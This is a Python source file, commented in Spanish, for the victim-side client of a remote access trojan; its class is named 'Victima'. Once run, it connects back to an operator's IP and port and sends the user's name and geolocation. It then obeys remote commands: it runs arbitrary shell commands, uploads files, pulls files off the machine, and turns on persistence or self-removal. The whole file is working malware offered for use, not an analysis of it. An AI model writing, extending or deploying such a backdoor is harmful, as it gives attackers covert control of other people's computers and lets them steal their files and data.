
# LIBRERIAS STANDARD

import os
import sys
import time
import socket
import json
import subprocess
import threading
import urllib.request
from getpass import getuser

# MODULOS DE OPERACIONES

import netcat 
import modulos.persistencia as persistencia


# PROGRAMA PRINCIPAL

plataforma = sys.platform

if plataforma.startswith('win'):
	plataforma = "win"
elif plataforma.startswith('linux'):
	plataforma = "linux"
elif plataforma.startswith('darwin'):
	plataforma = "mac"
else:
	print (" No existen variantes para este sistema.")
	sys.exit(0)



class Victima(object):

	# -------- CONFIGURACION DEL SERVIDOR --------

	def __init__(self, ip, port):

		super(Victima, self).__init__()
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.direccion = str(ip)
		self.puerto = int(port)


	# -------- ACCIONES BASICAS --------

	def iniciar(self):
		self.client.connect((self.direccion, self.puerto))
		return


	def detener(self):
		self.client.close()
		return


	def enviar(self,msg):
		self.client.send(bytes(msg,"utf-8"))
		return

	def enviar_todo(self,msg):
		self.client.sendall(bytes(msg,"utf-8"))
		return


	def recibir(self):
		raw_msg = self.client.recv(1024) 
		msg = (raw_msg).decode('utf-8')
		return msg

	def recibir_bytes(self):
		raw_msg = self.client.recv(1024) 
		return raw_msg


	# -------- RECOPILAR INFORMACION DE VICTIMA Y ENVIARLA --------


	def obtener_informacion(self):
		host = getuser()		
		url = urllib.request.urlopen("https://geoip-db.com/json")
		objeto = json.loads(url.read().decode())
		ip_info = objeto["city"] + "," + objeto["IPv4"] + "," + objeto["country_name"] + "," + objeto["state"]
		return [host,ip_info]


	def enviar_informacion(self):
		informacion = self.obtener_informacion()
		self.enviar(informacion[0])
		self.recibir()
		self.enviar(informacion[1])
		return	


	# -------- CONTROL SOBRE LA VICTIMA --------

	def control_total(self):
		while (True):
			datosEleccion = self.recibir()

			if (datosEleccion=="matar"):
				self.detener()
				break

			elif (datosEleccion=="subir"):
				self.subir_archivos()

			elif (datosEleccion=="descargar"):
				self.descargar_archivos()

			elif (datosEleccion=="cmd"):
				self.cmd()		

			elif (datosEleccion=="netcat"):
				self.netcat()			

			elif (datosEleccion=="persistencia"):
				self.persistencia()

			elif (datosEleccion=="autoremover"):
				self.autoremover()


		return



	# -------- MODULOS DE CONTROL --------


	def cmd(self):
		
		datos = self.recibir()
		#print(datos)

		while(True):

			if("cd " in datos):
				directorio = datos.replace('cd ', "")
				
				try:
					os.chdir(directorio)
					self.client.send(bytes("\n Ubicacion cambiada a: " + directorio,"utf-8"))
				except OSError: 
					self.client.send(bytes("\n No existe la ubicacion...",'utf-8'))

			elif (datos=='detener') or (datos=='exit'):
				#print('estoy deteniendome')
				self.enviar("ok")
				break


			else:
				#try:
					
				comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)
				#print(datos)
				#salida_texto = comando.stdout.read() + comando.stderr.read()
				#salida_completa = (salida_texto).decode('utf-8') + "\n Comando utilizado: "+datos
				
				#except UnicodeDecodeError:
				#	salida_completa = unicode(salida_texto,errors='ignore') + "\n Comando utilizado: "+datos

				salida = [x for x in comando.stdout.readlines()]
				self.enviar(str(len(salida)))
				time.sleep(0.001)

				for _ in salida:
					#print(_)
					self.enviar(_)
					time.sleep(0.001)


			datos = self.recibir()

			#print(datos)

		return

	def subir_archivos(self):

		# Envia el ok del modo de uso
		self.enviar('ok')

		# Recibe la ruta de destino donde se va a guardar el archivo y envia el 'ok'
		destino = self.recibir()
		self.enviar('ok')

		size = int(self.recibir())
		self.enviar('ok')
		print(size)

		# Abre el archivo nuevo 
		with open(destino, "wb") as archivo_destino:
			#contenido = self.client.recv(1024)
			#print(os.path.getsize(destino))
			while (size>0):
				contenido = self.client.recv(1024)
				archivo_destino.write(contenido)
				size-=len(contenido)
				print(size)

		return


	def descargar_archivos(self):

		# Envia el ok
		self.enviar('ok')

		# Recibe ruta origen
		origen = self.recibir()

		# Envia tamanio del archivo origen
		self.enviar(str(os.path.getsize(origen)))
		self.recibir()
		time.sleep(1)


		# Se prepara para el envio de datos del archivo
		with open(origen, "rb") as archivo_origen:
				contenido = archivo_origen.read(1024)
				while contenido:
					self.client.sendall(contenido)
					contenido = archivo_origen.read(1024) 

		return


	def netcat(self):
		time.sleep(1.5)
		#netcat.reverse_shell()
		#os.system('python3 netcat.py &')
		return ("Modulo en desarrollo")


	def persistencia(self):
		proceso,msg = persistencia.activar(plataforma)
		self.enviar(msg)
		return


	def autoremover(self):
		proceso,msg = autoremover.activar(plataforma)
		self.enviar(msg)
		return


def main(direccion,puerto):

	s = Victima(direccion,puerto)	
	s.iniciar()
	s.enviar_informacion()
	s.control_total()


if __name__ == '__main__':
	
	direccion=sys.argv[1]
	puerto=sys.argv[2]

	main(direccion,puerto)